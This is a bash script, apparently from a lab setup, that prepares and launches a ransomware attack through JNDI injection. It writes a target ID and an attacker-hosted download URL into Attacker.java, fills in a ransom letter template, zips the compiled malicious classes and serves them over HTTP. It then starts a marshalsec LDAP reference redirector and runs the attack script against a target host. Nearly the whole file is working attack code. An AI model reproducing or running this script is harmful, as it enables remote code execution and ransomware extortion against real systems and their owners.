#!/bin/bash

ATTACKING_HOST=10.160.0.10
SIMPLE_HTTP_PORT=9000
JNDI_PORT=9999
TARGET_HOST=10.160.0.254
TARGET_PORT=8090
ZIP_FILE="attacking_package.zip"

rm -rf /tmp/test/*
cd /opt/utils/malware

# Compile Java files
#. ./compile.sh
javac AttackerPrep.java
targetID=`java AttackerPrep | grep '^TargetID is: ' | awk '{print $3}'`
echo "Target ID = ${targetID}"
find /tmp/test

# Adjust Attacker.java and the ransom letter
sed -i "s#String targetID = \".*\";#String targetID = \"${targetID}\";#g" Attacker.java
sed -i "s#String urlStr = \".*\";#String urlStr = \"http://${ATTACKING_HOST}:${SIMPLE_HTTP_PORT}/${ZIP_FILE}\";#g" Attacker.java
cp -f letter.template letter.txt
sed -i "s#<CUSTOMER_ID>#${targetID}#g" letter.txt
javac Attacker.java DecryptFile.java
grep "tring targetID =" Attacker.java

# Compress the attacking package
cp *.class /tmp/test
cp letter.txt /tmp/test
cd /tmp/test
# Move privake key out of the folder
mv "KeyPair/privKey_${targetID}" /tmp
zip -r ${ZIP_FILE} *
cp "${ZIP_FILE}" /opt/utils/malware/
mv "/tmp/privKey_${targetID}" KeyPair/
cd -

# Start a simple HTTP service to provide 
cd /opt/utils/malware
ps -ef | grep "python.*http.server.*${SIMPLE_HTTP_PORT}" | grep -v grep | awk '{print $2}' | xargs -i kill -9 {}
python3 -m http.server ${SIMPLE_HTTP_PORT} &
# Run a RMI/LDAP reference redirector service
java -cp marshalsec-0.0.3-SNAPSHOT.jar marshalsec.jndi.LDAPRefServer "http://${ATTACKING_HOST}:${SIMPLE_HTTP_PORT}/#Attacker" ${JNDI_PORT} &
sleep 2

# Run attack
./attack.py
tail -f /dev/null
